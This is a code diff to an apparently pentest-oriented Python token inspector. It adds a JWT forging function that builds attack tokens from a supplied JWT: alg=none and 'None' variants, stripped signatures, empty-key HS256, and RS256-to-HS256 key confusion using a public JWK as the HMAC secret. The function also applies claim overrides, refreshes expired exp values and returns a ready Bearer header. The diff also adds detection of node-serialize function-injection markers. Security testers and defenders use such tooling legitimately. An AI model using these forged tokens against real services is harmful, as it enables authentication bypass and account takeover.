@@ -1,12 +1,13 @@
-"""Read-only offline JWT, opaque token, and serialization posture inspector.
+"""Offline JWT, opaque token, and serialization inspector + JWT confusion test builder.
 
-Zero network calls, zero token forging, and zero raw secret echoing.
+Zero network calls and zero raw secret echoing.
 """
 from __future__ import annotations
 
 import base64
 import binascii
 import hashlib
+import hmac
 import json
 from pathlib import Path
 import re
@@ -82,6 +83,17 @@ def _load_validator_helpers() -> tuple[Any, Any]:
         _CRYPTO_TOKEN_MOD = None
         _DESER_MOD = None
     return _CRYPTO_TOKEN_MOD, _DESER_MOD
+
+
+_HMAC_ALGS: dict[str, Any] = {
+    "HS256": hashlib.sha256,
+    "HS384": hashlib.sha384,
+    "HS512": hashlib.sha512,
+}
+
+
+def _b64url_encode(raw: bytes) -> str:
+    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
 
 
 def _b64url_decode_segment(segment: str) -> bytes | None:
@@ -316,6 +328,10 @@ def _detect_format_bytes(raw: bytes, deser_mod: Any) -> tuple[str, str]:
     if raw.startswith(_VIEWSTATE_MAGIC):
         return "viewstate", ""
 
+    if b"_$$ND_FUNC$$_" in raw or b"_$$ND_DATE$$_" in raw:
+        cls_hint = "IIFE" if b"_$$ND_FUNC$$_function" in raw and b"()" in raw else "function"
+        return "node_serialize", cls_hint
+
     if deser_mod is not None and hasattr(deser_mod, "detect_format"):
         try:
             detected = str(deser_mod.detect_format(raw) or "unknown")
@@ -401,9 +417,220 @@ def detect_serialization(value: str) -> dict[str, Any]:
     }
 
 
-def analyze_token(value: str, *, kind: str = "auto") -> dict[str, Any]:
-    """Unified read-only token/format auditor dispatching jwt, opaque, serialization, or auto."""
+def _jwk_rsa_to_spki_pem(raw_key_text: str) -> str:
+    """Convert an RSA JWK or JWKS JSON string into SubjectPublicKeyInfo PEM when possible."""
+    stripped = str(raw_key_text or "").strip()
+    if not stripped.startswith("{"):
+        return ""
+    try:
+        parsed = json.loads(stripped)
+    except ValueError:
+        return ""
+    if not isinstance(parsed, dict):
+        return ""
+    candidates: list[dict[str, Any]] = []
+    if isinstance(parsed.get("keys"), list):
+        candidates = [k for k in parsed["keys"] if isinstance(k, dict) and str(k.get("kty") or "").upper() == "RSA"]
+        sig_cands = [k for k in candidates if str(k.get("use") or "").lower() == "sig"]
+        if sig_cands:
+            candidates = sig_cands + [k for k in candidates if k not in sig_cands]
+    elif str(parsed.get("kty") or "").upper() == "RSA":
+        candidates = [parsed]
+    if not candidates:
+        return ""
+    chosen = candidates[0]
+    n_bytes = _b64url_decode_segment(str(chosen.get("n") or "").strip())
+    e_bytes = _b64url_decode_segment(str(chosen.get("e") or "").strip())
+    if not n_bytes or not e_bytes:
+        return ""
+    try:
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.hazmat.primitives.asymmetric import rsa
+
+        pub_num = rsa.RSAPublicNumbers(
+            int.from_bytes(e_bytes, "big"),
+            int.from_bytes(n_bytes, "big"),
+        )
+        pem_bytes = pub_num.public_key().public_bytes(
+            serialization.Encoding.PEM,
+            serialization.PublicFormat.SubjectPublicKeyInfo,
+        )
+        return pem_bytes.decode("ascii")
+    except Exception:
+        return ""
+
+
+def _sign_jwt(
+    header: dict[str, Any],
+    payload: dict[str, Any],
+    *,
+    sign_alg: str,
+    key_bytes: bytes | None = None,
+) -> str:
+    hdr = dict(header)
+    hdr["alg"] = sign_alg
+    hdr.setdefault("typ", "JWT")
+    h_seg = _b64url_encode(json.dumps(hdr, ensure_ascii=False, separators=(",", ":")).encode("utf-8"))
+    p_seg = _b64url_encode(json.dumps(payload, ensure_ascii=False, separators=(",", ":")).encode("utf-8"))
+    signing_input = f"{h_seg}.{p_seg}"
+    if sign_alg.lower() == "none" or key_bytes is None:
+        return f"{signing_input}."
+    hash_fn = _HMAC_ALGS[sign_alg.upper()]
+    sig = hmac.new(key_bytes, signing_input.encode("ascii"), hash_fn).digest()
+    return f"{signing_input}.{_b64url_encode(sig)}"
+
+
+def build_jwt_test_variants(
+    value: str = "",
+    *,
+    alg: str = "",
+    hmac_key: str = "",
+    claim_overrides: dict[str, Any] | None = None,
+    base_header: dict[str, Any] | None = None,
+    base_payload: dict[str, Any] | None = None,
+) -> dict[str, Any]:
+    """Build JWT alg=none or HMAC key-confusion test tokens locally without network calls."""
+    header: dict[str, Any] = {}
+    payload: dict[str, Any] = {}
+    parsed_from_claims = False
+
+    if isinstance(base_header, dict) or isinstance(base_payload, dict):
+        header = dict(base_header or {"typ": "JWT"})
+        payload = dict(base_payload or {})
+    else:
+        raw = _strip_bearer(value)
+        parts = raw.split(".") if raw else []
+        if len(parts) == 3:
+            hb = _b64url_decode_segment(parts[0])
+            pb = _b64url_decode_segment(parts[1])
+            if hb is None or pb is None:
+                raise ValueError("invalid base64url JWT segments in value")
+            try:
+                h_obj = json.loads(hb.decode("utf-8"))
+                p_obj = json.loads(pb.decode("utf-8"))
+            except (UnicodeDecodeError, ValueError) as exc:
+                raise ValueError("invalid JSON in base JWT segments") from exc
+            if not isinstance(h_obj, dict) or not isinstance(p_obj, dict):
+                raise ValueError("JWT header and payload must be JSON objects")
+            header, payload = dict(h_obj), dict(p_obj)
+        elif raw.startswith("{"):
+            try:
+                p_obj = json.loads(raw)
+            except ValueError as exc:
+                raise ValueError("invalid JSON payload in value") from exc
+            if not isinstance(p_obj, dict):
+                raise ValueError("JWT JSON value must decode to an object")
+            header = {"typ": "JWT"}
+            payload = dict(p_obj)
+            parsed_from_claims = True
+        elif not raw and isinstance(claim_overrides, dict):
+            header = {"typ": "JWT"}
+            payload = {}
+            parsed_from_claims = True
+        else:
+            raise ValueError(
+                "jwt_test expects value as a JWT ('eyJ...'), JSON payload object, or 'actor:<alias>'"
+            )
+
+    if isinstance(claim_overrides, dict):
+        payload.update(claim_overrides)
+
+    now = int(time.time())
+    if parsed_from_claims:
+        if "iat" not in payload and "exp" not in payload:
+            payload["iat"] = now
+            payload["exp"] = now + 3600
+    elif isinstance(payload.get("exp"), (int, float)) and not isinstance(payload.get("exp"), bool):
+        if float(payload["exp"]) < now and (not isinstance(claim_overrides, dict) or "exp" not in claim_overrides):
+            payload["exp"] = now + 3600
+
+    eff_key = str(hmac_key or "")
+    key_source = "literal" if eff_key else "none"
+    if eff_key.startswith(("-----BEGIN ", "-----BEGIN\t")) and "\n" not in eff_key and "\\n" in eff_key:
+        eff_key = eff_key.replace("\\r\\n", "\n").replace("\\n", "\n")
+    jwk_pem = _jwk_rsa_to_spki_pem(eff_key)
+    if jwk_pem:
+        eff_key = jwk_pem
+        key_source = "jwks_rsa_pem"
+
+    req_alg = str(alg or "").strip()
+    norm_upper = req_alg.upper()
+    variants: list[dict[str, str]] = []
+    seen_tokens: set[str] = set()
+
+    def _add_variant(label: str, sign_alg: str, key_bytes: bytes | None) -> None:
+        tok = _sign_jwt(header, payload, sign_alg=sign_alg, key_bytes=key_bytes)
+        if tok in seen_tokens:
+            return
+        seen_tokens.add(tok)
+        variants.append({"label": label, "alg": sign_alg, "token": tok})
+
+    if norm_upper in _HMAC_ALGS:
+        key_bytes = eff_key.encode("utf-8")
+        _add_variant(f"{norm_upper.lower()}_exact", norm_upper, key_bytes)
+        stripped_key = eff_key.strip("\r\n")
+        if eff_key and stripped_key != eff_key:
+            _add_variant(f"{norm_upper.lower()}_stripped", norm_upper, stripped_key.encode("utf-8"))
+    elif req_alg.lower() == "none":
+        _add_variant("alg_none", req_alg, None)
+        alt_none = "None" if req_alg == "none" else "none"
+        _add_variant("alg_none_alt", alt_none, None)
+    elif req_alg.lower() == "strip_sig":
+        orig_alg = str(header.get("alg") or "RS256")
+        _add_variant("strip_sig", orig_alg, None)
+    elif req_alg.lower() in {"", "confusion", "auto"}:
+        if eff_key:
+            _add_variant("hs256_exact", "HS256", eff_key.encode("utf-8"))
+            stripped_key = eff_key.strip("\r\n")
+            if stripped_key != eff_key:
+                _add_variant("hs256_stripped", "HS256", stripped_key.encode("utf-8"))
+            _add_variant("alg_none", "none", None)
+        else:
+            _add_variant("alg_none", "none", None)
+            _add_variant("alg_none_title", "None", None)
+            _add_variant("hs256_empty", "HS256", b"")
+            orig_alg = str(header.get("alg") or "").strip()
+            if orig_alg and orig_alg.lower() != "none":
+                _add_variant("strip_sig", orig_alg, None)
+    else:
+        raise ValueError(
+            f"unsupported jwt_test alg: {alg!r}; expected none, HS256, HS384, HS512, confusion, or strip_sig"
+        )
+
+    primary = variants[0]
+    return {
+        "kind": "jwt_test",
+        "alg": primary["alg"],
+        "token": primary["token"],
+        "auth_header": f"Bearer {primary['token']}",
+        "header": {**header, "alg": primary["alg"], "typ": header.get("typ", "JWT")},
+        "payload": _sanitize_claims(payload),
+        "hmac_key_len": len(eff_key.encode("utf-8")) if eff_key else 0,
+        "hmac_key_sha256_8": hashlib.sha256(eff_key.encode("utf-8")).hexdigest()[:8] if eff_key else "",
+        "hmac_key_source": key_source,
+        "variants": variants,
+    }
+
+
+def analyze_token(
+    value: str,
+    *,
+    kind: str = "auto",
+    alg: str = "",
+    hmac_key: str = "",
+    claim_overrides: dict[str, Any] | None = None,
+) -> dict[str, Any]:
+    """Offline token/format auditor + optional JWT alg/key-confusion test token builder."""
     mode = str(kind or "auto").strip().lower()
+    if mode in {"jwt_test", "jwt_forge", "jwt_confusion"} or (
+        mode in {"auto", "jwt"} and (str(alg or "").strip() or str(hmac_key or "") or claim_overrides is not None)
+    ):
+        return build_jwt_test_variants(
+            value,
+            alg=alg,
+            hmac_key=hmac_key,
+            claim_overrides=claim_overrides,
+        )
     dispatch: dict[str, Callable[[str], dict[str, Any]]] = {
         "jwt": analyze_jwt,
         "opaque": analyze_opaque_token,
